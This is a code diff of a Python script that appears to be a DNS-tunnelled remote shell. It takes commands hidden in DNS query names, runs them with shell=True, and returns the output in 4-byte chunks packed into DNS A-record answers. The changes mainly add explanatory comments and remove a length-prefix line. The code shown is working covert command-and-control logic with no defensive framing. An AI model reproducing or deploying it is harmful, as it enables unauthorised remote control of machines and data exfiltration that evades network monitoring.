@@ -32,15 +32,15 @@ while True:
     if(cmd[0] != "devtoplay"):
         if(last != cmd[0] and req_left == 0):
             i = 0
-            while(cmd[0][i] >= "0" and cmd[0][i] <= "9"):
+            while(cmd[0][i] >= "0" and cmd[0][i] <= "9"): # split salt and command
                 i += 1
             
-            if("cd" in cmd[0][i:]):
+            if("cd" in cmd[0][i:]): # cd is a built-in command so we can't use subprocess
                 os.chdir(cmd[0][i+3:])
-                res=b'\x00\x00\x00\x00'
+                res=b'\x00\x00\x00\x00' # No return
             else:
-                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-                res,err = p.communicate()
+                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True) # Run command in a subprocess
+                res,err = p.communicate() # Get the output
 
                 if(res is None or res == b''):
                     res = err
@@ -48,16 +48,15 @@ while True:
                 if(res is None):
                     res = b''
                 
-                res = len(res).to_bytes(1,'big') + res
                 sel = int(cmd[0][:i],10)
-                a = [RR("",res[j:j+4], 1, 1, 1) for j in range(0,len(res),4)]
-                req_left = len(a)
+                a = [RR("",res[j:j+4], 1, 1, 1) for j in range(0,len(res),4)] # Create subpart of the answer
+                req_left = len(a) # Number of answer to send
                 l = len(a[req_left - 1].rdata)
                 
-                if(l != 4):
+                if(l != 4): # If the last answer is less than 4 bytes
                     a[req_left - 1].rdata += b'\x00' * (4 - l)
                     
-                a.append(RR("",b'\x00\x00\x00\x00', 1, 1, 1))
+                a.append(RR("",b'\x00\x00\x00\x00', 1, 1, 1)) # Ending sequence
                 req_left += 1
                 req = 0
 
